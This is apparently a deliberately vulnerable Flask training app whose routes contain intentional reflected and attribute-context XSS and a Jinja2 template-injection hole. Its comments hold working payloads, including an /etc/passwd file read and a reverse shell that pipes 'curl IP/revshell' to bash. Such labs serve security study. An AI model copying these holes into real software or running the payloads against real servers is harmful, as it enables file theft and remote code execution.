from flask import Flask, render_template_string, render_template, request
import db

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        db.add_comment(request.form['comment'])

    search_query = request.args.get('q')

    comments = db.get_comments(search_query)

    return render_template('index.html',
                           comments=comments,
                           search_query=search_query)



@app.route("/reflectedxss", methods=['GET'])
def refl():
    name = request.args.get('name') or None; # get untrusted query param
    return 'hi ' + name;

@app.route("/contextxss", methods=['GET'])
#https://portswigger.net/support/exploiting-xss-injecting-into-tag-attributes
def contextxss():
    name = request.args.get('name') or None; # get untrusted query param
    return '<a href=' + name + '>click me!</a>';

@app.route("/imgxss", methods=['GET'])
def imgxss():
    #http://localhost:5000/imgxss?image_link=https://i.natgeofe.com/n/4bf47147-ce80-49c6-98ae-52f63349045f/67655.jpg?w=130&h=130
    #" onload="alert(1)
    # "" onerror=alert(1)
    image_link = request.args.get('image_link') or None; # get untrusted query param
    return '<img src=' + image_link + '>';



@app.route("/ssti", methods=['GET'])
def home():
    name = request.args.get('name') or None; # get untrusted query param

    #ref: https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
    # https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
    #basic poc: {{config.items()}}
    #fileread poc: passwd: 
    # {{%27abc%27.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0](%27/etc/passwd%27).read()}} 
    #rev shell: 
    # {{request.application.__globals__.__builtins__.__import__('os').popen('curl IP/revshell | bash').read()}}

    return render_template_string(name); # render it into template 
